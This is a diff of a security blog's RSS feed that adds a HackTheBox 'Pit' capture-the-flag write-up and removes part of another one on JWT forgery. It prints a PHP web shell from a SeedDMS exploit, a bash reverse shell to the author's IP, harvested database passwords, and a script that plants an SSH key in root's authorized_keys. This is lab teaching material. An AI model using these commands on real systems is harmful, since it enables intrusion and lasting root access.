+/TODO                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2844<span class="o">]</span>
+/Guests.php           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
+/GuideImages.php      <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
+/HB.php               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
+/HDRS.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
+<span class="o">===============================================================</span>
+2021/05/20 15:22:45 <span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</code></pre></div><p>Poking <code>/CHANGELOG</code> with curl reveals the software version.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
+$ curl -s http://dms-pit.htb/seeddms51x/seeddms/CHANGELOG  <span class="p">|</span> head 
+--------------------------------------------------------------------------------
+                     Changes in version 5.1.15
+--------------------------------------------------------------------------------
+- Improved import from file system
+- HTTP Proxy <span class="k">for</span> access on external extension repository can be <span class="nb">set</span>
+- Do not use unzip in ExtensionMgr anymore
+- fix version compare on info page
+- allow one page mode on search page
+- fix import of older extension versions from repository
+</code></pre></div><h4 id="searchsploit-1">Searchsploit</h4>
+<p>I feed the version to <code>searchsploit</code>, and it returns with some potential exploits, there is one for RCE.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «pit» «10.10.14.49»
+$ searchsploit seeddms
+--------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                             <span class="p">|</span>  Path
+--------------------------------------------------------------------------- ---------------------------------
+SeedDMS 5.1.18 - Persistent Cross-Site Scripting                           <span class="p">|</span> php/webapps/48324.txt
+SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.GroupMgr.php&#39;</span> Cross-Site Scripting                 <span class="p">|</span> php/webapps/47024.txt
+SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.UsrMgr.php&#39;</span> Cross-Site Scripting                   <span class="p">|</span> php/webapps/47023.txt
+SeedDMS versions &lt; 5.1.11 - Remote Command Execution                       <span class="p">|</span> php/webapps/47022.txt
+--------------------------------------------------------------------------- ---------------------------------
+</code></pre></div><p>The exploitation steps for the RCE vulnerability is as follow:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]
+</span><span class="err"># Google Dork: [NA]
+</span><span class="err"># Date: [20-June-2019]
+</span><span class="err"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
+</span><span class="err"># Vendor Homepage: [https://www.seeddms.org]
+</span><span class="err"># Software Link: [https://sourceforge.net/projects/seeddms/files/]
+</span><span class="err"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)
+</span><span class="err"># Tested on: [NA]
+</span><span class="err"># CVE : [CVE-2019-12744]
+</span><span class="err">
+</span><span class="err">Exploit Steps:
+</span><span class="err">
+</span><span class="err">Step 1: Login to the application and under any folder add a document.
+</span><span class="err">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
+</span><span class="err">
+</span><span class="err">PHP Backdoor Code: 
+</span><span class="err">&lt;?php
+</span><span class="err">
+</span><span class="err">if(isset($_REQUEST[&#39;cmd&#39;])){
+</span><span class="err">        echo &#34;&lt;pre&gt;&#34;;
+</span><span class="err">        $cmd = ($_REQUEST[&#39;cmd&#39;]);
+</span><span class="err">        system($cmd);
+</span><span class="err">        echo &#34;&lt;/pre&gt;&#34;;
+</span><span class="err">        die;
+</span><span class="err">}
+</span><span class="err">
+</span><span class="err">?&gt;
+</span><span class="err">
+</span><span class="err">Step 3: Now after uploading the file check the document id corresponding to the document.
+</span><span class="err">Step 4: Now go to example.com/data/1048576/&#34;document_id&#34;/1.php?cmd=cat+/etc/passwd to get the command response in browser.
+</span><span class="err">
+</span><span class="err">Note: Here &#34;data&#34; and &#34;1048576&#34; are default folders where the uploaded files are getting saved.
+</span></code></pre></div><p>I will need a valid credentials for RCE.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-nginx">Shell as nginx</h3>
+<h4 id="seeddms">SeedDMS</h4>
+<p><code>admin:admin</code> are the default credentials for SeedDMS.</p>
+<p><div class="img-container"><img src="imgs/image-20210521014957029.png" alt="image-20210521014957029"  /></div>
+</p>
+<p>But these creds didn&rsquo;t work here, so I submit <code>michelle:michelle</code>, and it logs me in 😮 !</p>
+<p><div class="img-container"><img src="imgs/image-20210521023728548.png" alt="image-20210521023728548"  /></div>
+</p>
+<h4 id="seeddms-cve-2019-12744">SeedDMS CVE-2019-12744</h4>
+<p>With a valid account, I can try to reproduce the exploitation steps for remote code execution.</p>
+<p>First, I will create a document by navigating to <code>Docs &gt; Users &gt; Michelle</code> (folders), and then under <code>michelle</code> folder I will add a new document.</p>
+<p><div class="img-container"><img src="imgs/image-20210521025006867.png" alt="image-20210521025006867"  /></div>
+</p>
+<p>On the local file menu, I will browse and upload my PHP web shell.</p>
+<p><div class="img-container"><img src="imgs/image-20210521025924716.png" alt="image-20210521025924716"  /></div>
+</p>
+<p>And the file gets uploaded.</p>
+<p><div class="img-container"><img src="imgs/image-20210521030038234.png" alt="image-20210521030038234"  /></div>
+</p>
+<p>According to the exploit author, the uploaded web shell should be available at  <code>http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id</code>, where <code>63</code> is my document ID, I couldn&rsquo;t find it there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ curl -s <span class="s1">&#39;http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id&#39;</span>
+File not found.
+</code></pre></div><p>The web server somehow has a weird routing, so I downloaded the SeedDMS source code to figure out its folder structure, and it was on <code>http://dms-pit.htb/seeddms51x/data/1048576/64/1.php?f=id</code>!</p>
+<p><div class="img-container"><img src="imgs/image-20210521031346742.png" alt="image-20210521031346742"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>I will send a bash reverse shell to get a foothold on the box.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">/bin/bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/53 0&gt;&amp;1&#34;</span>
+</code></pre></div><p>On my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «exploits» «10.10.14.49»
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.241<span class="o">]</span> <span class="m">58888</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>26319<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+bash-4.4$ id
+id
+<span class="nv">uid</span><span class="o">=</span>992<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-michelle">Shell as Michelle</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Searching for string &ldquo;pass&rdquo; under <code>/var/www/html/seeddms51x/conf</code> reveals the database credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ <span class="nb">pwd</span>
+<span class="nb">pwd</span>
+/var/www/html/seeddms51x/conf
+bash-4.4$  grep -Ri <span class="s2">&#34;pass&#34;</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;mysql&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;ied^ieY6xoquu&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>Under <code>/var/www/html/seeddms51x/data/conf</code> there is also another database credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ <span class="nb">pwd</span>
+<span class="nb">pwd</span>
+/var/www/html/seeddms51x/data/conf
+bash-4.4$ grep -Ri pass
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;sqlite&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;/home/www-data/seeddms51x/data/content.db&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>The password <code>ied^ieY6xoquu</code> is the one that valid.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
+mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
+Database
+information_schema
+seeddms
+</code></pre></div><p>But, I didn&rsquo;t find anything juicy in the database.</p>
+<h4 id="cockpit-tcp-9090">Cockpit (TCP 9090)</h4>
+<p>Using <code>Michelle:ied^ieY6xoquu</code> on the Cockpit login page at <code>https://pit.htb:9090</code> logs me in.</p>
+<p><div class="img-container"><img src="imgs/image-20210521063658472.png" alt="image-20210521063658472"  /></div>
+</p>
+<p>Cockpit gives terminal access through its web interface to communicate with the system.</p>
+<p>Because of SELinux, I couldn&rsquo;t get my reverse shell to work, so I will just use this terminal and grab the user flag.</p>
+<p><div class="img-container"><img src="imgs/image-20210521064953236.png" alt="image-20210521064953236"  /></div>
+</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>For the SNMP enumeration, I will remember <code>/usr/bin/monitoring</code>, which turned out to be a bash script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ cat /usr/bin/monitor
+<span class="c1">#!/bin/bash</span>
+
+<span class="k">for</span> script in /usr/local/monitoring/check*sh
+<span class="k">do</span>
+    /bin/bash <span class="nv">$script</span>
+<span class="k">done</span>
+</code></pre></div><p>The script takes and executes other scripts which filename begins <code>check</code> and end with <code>sh</code> from <code>/usr/local/monitoring/</code> . If I try to list the content of that directory, it returns with permission denied.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ ls -l /usr/local/monitoring/
+ls: cannot open directory <span class="s1">&#39;/usr/local/monitoring/&#39;</span>: Permission denied
+</code></pre></div><p>But with <code>-ld</code>, it shows that the folder has extended permission, and user <code>michelle</code> is allowed to write a file under that directory.</p>
+<pre tabindex="0"><code>[michelle@pit /]$ ls -ld /usr/local/monitoring/
+drwxrwx---+ 2 root root 122 May 20 20:35 /usr/local/monitoring/
+[michelle@pit /]$ getfacl /usr/local/monitoring/
+getfacl: Removing leading '/' from absolute path names
+# file: usr/local/monitoring/
+# owner: root
+# group: root
+user::rwx
+user:michelle:-wx
+group::rwx
+mask::rwx
+other::---
+</code></pre><h4 id="from-snmp-to-rce">From SNMP to RCE</h4>
+<p>From the SNMP enumeration, each time an SNMP &ldquo;walk&rdquo; is performed,  <code>usr/bin/monitor</code> always pops up in the <code>NET-SNMP-EXTEND-MIB</code> section.</p>
+<p><div class="img-container"><img src="imgs/image-20210521075856288.png" alt="image-20210521075856288"  /></div>
+</p>
+<p>Based on the output above, and the following  <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending">documentation</a>, there is a chance that when a SNMP walk is performed, Net-SNMP agent will also execute <code>/usr/bin/monitor</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20211013161852076.png" alt="image-20211013161852076"  /></div>
+</p>
+<p>So the idea here is that, I can try to write a file such as <code>check_blabla.sh</code> under <code>/usr/local/monitoring/</code> where <code>/usr/bin/monitor</code> then I will do a SNMP walk to trigger the Net-SNMP agent to execute <code>/usr/bin/monitor</code> which then eventually executes my script.</p>
+<p>Now I will write a script to <code>/usr/local/monitoring/</code> that will inject my SSH public key to the root&rsquo;s authorized_keys file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\nmkdir -p /root/.ssh/ 2&gt;/dev/null &amp;&amp; echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#34; &gt; /root/.ssh/authorized_keys&#39;</span> &gt; /usr/local/monitoring/check_iamf.sh
+</code></pre></div><p>Then I will do another  SNMP walk and wait for it to finish, or at least get to the NET-SNMP-EXTEND-MIB output line.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ snmpwalk -v 2c -c public 10.10.10.241 internet
+</code></pre></div><p>And now if I try to SSH login as root to Pit, it logs me in.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
+$ ssh root@10.10.10.241
+Web console: https://pit.htb:9090/
+
+Last login: Thu May <span class="m">20</span> 21:12:44 <span class="m">2021</span> from 10.10.14.49
+<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># ls -l</span>
+total <span class="m">8</span>
+-rwx------. <span class="m">1</span> root root <span class="m">706</span> Apr <span class="m">22</span>  <span class="m">2020</span> cleanup.sh
+drwx------. <span class="m">2</span> root root <span class="m">122</span> Apr <span class="m">18</span>  <span class="m">2020</span> monitoring
+lrwxrwxrwx. <span class="m">1</span> root root   <span class="m">9</span> May <span class="m">10</span> 11:07 null -&gt; /dev/null
+-r--------. <span class="m">1</span> root root  <span class="m">33</span> May <span class="m">20</span> 02:00 root.txt
+<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1">#</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210521081359037.png" alt="image-20210521081359037"  /></div>
+</p>
+<blockquote>
+<p>Phew, I didn&rsquo;t expect this writeup to be this long. 😅🔨</p>
+</blockquote>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Validation</title>
       <link>https://fahmifj.github.io/hackthebox/validation/</link>
@@ -884,359 +1395,6 @@ c3744...<span class="o">[</span>SNIP<span class="o">]</span>...
 <p>Then, add alias for <code>gedit</code> that points to the wrapper (<code>gedit-null</code>) in  <code>.bashrc</code> or <code>.zshrc</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nb">echo</span>  <span class="s1">&#39;alias gedit=&#34;gedit-null&#34;&#39;</span>  &gt; ~/.zshrc
 $ <span class="nb">source</span> ~/.zshrc
-</code></pre></div>]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - TheNotebook</title>
-      <link>https://fahmifj.github.io/hackthebox/thenotebook/</link>
-      <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/hackthebox/thenotebook/</guid>
-      <description>Abusing JWT key identifier and breaking out of a Docker container</description>
-      <content:encoded><![CDATA[<p>TheNotebook from Hack The Box hosts a web-based note application and it uses a JWT token for its authentication cookie. The token can be forged to escalate myself to admin. With admin-level access, it is possible to drop a PHP web shell using the upload functionality, resulting in shell access to the system. Enumerating on the system discovers a backup file that contains SSH keys of a user. The user is allowed run a Docker container with <code>sudo</code> permissions. The Docker version in this machine is vulnerable to CVE-2019-5736. Along with the <code>sudo</code> permissions, the Docker vulnerability can be exploited to gain root access.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>JWT Key ID</li>
-<li>Docker breakout using CVE-2019-573</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li><a href="https://jwt.io">https://jwt.io</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan discovers two open ports, SSH on port 22 and a NGINX web server on port 80.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
-$ fscan 10.10.10.230 thenotebook
-nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.230 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
-nmap -p22,80,10010 -sC -sV -oA nmap/10-tcp-allport-thenotebook 10.10.10.230
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-07 02:29 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.230
-Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
-
-PORT      STATE    SERVICE VERSION
-22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-title: The Notebook - Your Note Keeper
-10010/tcp filtered rxapi
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.67 seconds
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>On port 80, the machine hosts a web application called &ldquo;The Notebook&rdquo;.</p>
-<p><div class="img-container"><img src="imgs/image-20210807133719995.png" alt="image-20210807133719995"  /></div>
-</p>
-<p>I tried some default credentials on the login page, but no luck, so I will just register an account.</p>
-<p><div class="img-container"><img src="imgs/image-20210807134833301.png" alt="image-20210807134833301"  /></div>
-</p>
-<p>And the site automatically logs me in.</p>
-<p><div class="img-container"><img src="imgs/image-20210807135132964.png" alt="image-20210807135132964"  /></div>
-</p>
-<p>I can create a note on <code>/notes</code>. I will setup a Python web server and I add a note that contains my HTB IP. Unfortunately, there is no incoming request on my web server.</p>
-<p><div class="img-container"><img src="imgs/image-20210807135517614.png" alt="image-20210807135517614"  /></div>
-</p>
-<p>My note has link of <code>10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/8</code>. Because the second path looks like a GUID which is unique, so I think the attack is not an IDOR.</p>
-<p>Although, I said it&rsquo;s not an IDOR, I have a cool trick to share:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
-$ curl -sI 10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/<span class="o">{</span>7..8<span class="o">}</span>
-HTTP/1.1 <span class="m">401</span> UNAUTHORIZED
-Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:48 GMT
-Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
-Content-Length: <span class="m">12</span>
-Connection: keep-alive
-
-HTTP/1.1 <span class="m">200</span> OK
-Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:49 GMT
-Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
-Content-Length: <span class="m">1710</span>
-Connection: keep-alive
-</code></pre></div><h4 id="gobuster">Gobuster</h4>
-<p>Running a <code>gobuster</code> scan reveals that there is an admin page (<code>/admin</code>), but I have no access there.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
-$ gobuster dir -u http://10.10.10.230/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x txt -o gobuster/gobuster-S-80 -t <span class="nv">40</span> 
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.230/
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Extensions:              txt
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/08/07 02:44:26 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9<span class="o">]</span>
-/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250<span class="o">]</span>
-/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.230/<span class="o">]</span>
-/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422<span class="o">]</span>                          
-                                                                          
-<span class="o">===============================================================</span>
-2021/08/07 02:44:49 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
-</code></pre></div><h4 id="playing-with-jwt-cookie">Playing with JWT Cookie</h4>
-<p>While inspecting the browser storage, I find the site generates two cookie:  <code>auth</code> and <code>uuid</code>. The <code>auth</code> cookie is a JWT token.</p>
-<p><div class="img-container"><img src="imgs/image-20210807141947185.png" alt="image-20210807141947185"  /></div>
-</p>
-<blockquote>
-<p>Note: JWT token consists of header, payload, and signature that are separated by a dot and each part is encoded with base64.</p>
-</blockquote>
-<p>The <code>auth</code> cookie can decoded using <a href="https://jwt.io/">jwt.io</a>.</p>
-<p><div class="img-container"><img src="imgs/image-20210807143329934.png" alt="image-20210807143329934"  /></div>
-</p>
-<p>The value of <code>kid</code> (key identifier) and <code>admin_cap</code> are interesting vectors to play with. First, I will grab the header value and decode it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
-$ <span class="nb">echo</span> <span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9&#39;</span> <span class="p">|</span> base64 -d
-<span class="o">{</span><span class="s2">&#34;typ&#34;</span>:<span class="s2">&#34;JWT&#34;</span>,<span class="s2">&#34;alg&#34;</span>:<span class="s2">&#34;RS256&#34;</span>,<span class="s2">&#34;kid&#34;</span>:<span class="s2">&#34;http://localhost:7070/privKey.key&#34;</span><span class="o">}</span>
-</code></pre></div><p>I can try to modify the <code>kid</code> value to point to my IP, then I will encode the header back to base64.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
-$ <span class="nb">echo</span> -n <span class="s1">&#39;{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;RS256&#34;,&#34;kid&#34;:&#34;http://10.10.14.17/privKey.key&#34;}&#39;</span> <span class="p">|</span> base64 -w0
-eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNy9wcml2S2V5LmtleSJ9
-</code></pre></div><p>I will put back the forged header to the <code>auth</code> cookie and setup a Python web server afterwards.</p>
-<p>When I refresh the page, there is an incoming request for <code>privKey.key</code> to my web server.</p>
-<p><div class="img-container"><img src="imgs/image-20210807151313793.png" alt="image-20210807151313793"  /></div>
-</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-www-data">Shell as www-data</h3>
-<h4 id="escalate-to-web-admin">Escalate to web admin</h4>
-<p>Since the  <code>kid</code>  value can be controlled by me, I can forge a token that has <code>admin_cap</code>  value set to <code>true</code> and so the app will look for my private key and eventually validates my forged token using that key.</p>
-<p>First, I will create <code>privKey.key</code> using <code>ssh-keygen</code>. I will host this key using Python web server.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
-$ ssh-keygen -t rsa -P <span class="s2">&#34;&#34;</span> -b <span class="m">4096</span> -m PEM -f privKey.key
-Generating public/private rsa key pair.
-Your identification has been saved in privKey.key
-Your public key has been saved in privKey.key.pub
-The key fingerprint is:
-SHA256:IWMd7YYOw6gQT2tpGCtbx3Iaav2yW1qs8lyYGVl90fo kali@kali
-The key<span class="err">&#39;</span>s randomart image is:
-+---<span class="o">[</span>RSA 4096<span class="o">]</span>----+
-<span class="p">|</span>        .o.      <span class="p">|</span>
-<span class="p">|</span>o .   .. .o.     <span class="p">|</span>
-<span class="p">|</span> B + ++.o+.      <span class="p">|</span>
-<span class="p">|</span><span class="o">=</span> X B.+oooo      <span class="p">|</span>
-<span class="p">|</span>.B.X   +S..      <span class="p">|</span>
-<span class="p">|</span>o.o.*   .  E     <span class="p">|</span>
-<span class="p">|</span>.  +.<span class="o">=</span>           <span class="p">|</span>
-<span class="p">|</span> ...*.           <span class="p">|</span>
-<span class="p">|</span>  oB+            <span class="p">|</span>
-+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
-</code></pre></div><p>I will head to <a href="https://jwt.io/">jwt.io</a> to forge a new token and sign it using my <code>privKey.key</code>, and I will put this forged token to the <code>auth</code> cookie.</p>
-<p><div class="img-container"><img src="imgs/image-20210807152924854.png" alt="image-20210807152924854"  /></div>
-</p>
-<p>When I refresh the browser, a new menu called &ldquo;Admin Panel&rdquo; pops up.</p>
-<p><div class="img-container"><img src="imgs/image-20210807153522086.png" alt="image-20210807153522086"  /></div>
-</p>
-<p>Clicking the Admin Panel points to <code>/admin</code> where I see two options there: <code>View Notes</code> and <code>Upload File</code>.</p>
-<p><div class="img-container"><img src="imgs/image-20210807154045797.png" alt="image-20210807154045797"  /></div>
-</p>
-<p>The <code>View Notes</code> button links to <code>/admin/viewnotes</code>, and in this page all users' note can be viewed by the admin.</p>
-<p><div class="img-container"><img src="imgs/image-20210807154240999.png" alt="image-20210807154240999"  /></div>
-</p>
-<p>Two interesting notes created by the admin are titled: <code>Need to fix config</code> and <code>Backups are scheduled</code>.  The first note contains information about a security issue.</p>
